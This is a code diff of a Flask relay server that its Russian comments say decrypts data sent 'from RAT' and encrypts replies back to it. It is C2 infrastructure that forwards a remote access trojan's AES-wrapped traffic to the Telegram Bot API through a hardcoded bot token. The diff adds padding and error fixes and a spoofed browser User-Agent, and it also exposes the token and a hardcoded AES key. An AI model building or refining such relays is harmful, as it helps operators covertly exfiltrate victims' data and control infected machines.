@@ -5,26 +5,33 @@ import base64
 import json
 import os
 from Crypto.Cipher import AES
-from Crypto.Util.Padding import unpad
+from Crypto.Util.Padding import unpad, pad
 import hashlib
 
 app = Flask(__name__)
 CORS(app)
 
+# 🔐 ТВОЙ ТОКЕН И КЛЮЧ
 TOKEN = "8244921168:AAHRyemnt7kRBzSJT-QM6iExJHoPlDubgtM"
 AES_KEY = b'mysecretkey12345678901234567890'  # 32 байта
 
 def decrypt_aes(encrypted_b64):
-    encrypted = base64.b64decode(encrypted_b64)
-    iv = encrypted[:16]
-    ciphertext = encrypted[16:]
-    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
-    decrypted = cipher.decrypt(ciphertext)
-    return unpad(decrypted, AES.block_size).decode('utf-8')
+    """Расшифровка данных от RAT"""
+    try:
+        encrypted = base64.b64decode(encrypted_b64)
+        iv = encrypted[:16]
+        ciphertext = encrypted[16:]
+        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+        decrypted = cipher.decrypt(ciphertext)
+        return unpad(decrypted, AES.block_size).decode('utf-8')
+    except Exception as e:
+        print(f"Decrypt error: {e}")
+        return None
 
 def encrypt_aes(data):
+    """Шифрование ответа для RAT"""
     cipher = AES.new(AES_KEY, AES.MODE_CBC)
-    ct_bytes = cipher.encrypt(data)
+    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
     iv = cipher.iv
     return base64.b64encode(iv + ct_bytes).decode('utf-8')
 
@@ -37,9 +44,12 @@ def proxy():
         
         # Расшифровываем запрос
         decrypted = decrypt_aes(data['data'])
+        if not decrypted:
+            return {"error": "Decryption failed"}, 400
+            
         payload = json.loads(decrypted)
         
-        headers = {'User-Agent': 'Mozilla/5.0'}
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
         
         if payload.get('type') == 'message':
             url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
@@ -67,6 +77,7 @@ def proxy():
         return {"data": encrypted_response}
         
     except Exception as e:
+        print(f"Proxy error: {str(e)}")
         return {"error": str(e)}, 500
 
 @app.route('/health', methods=['GET'])
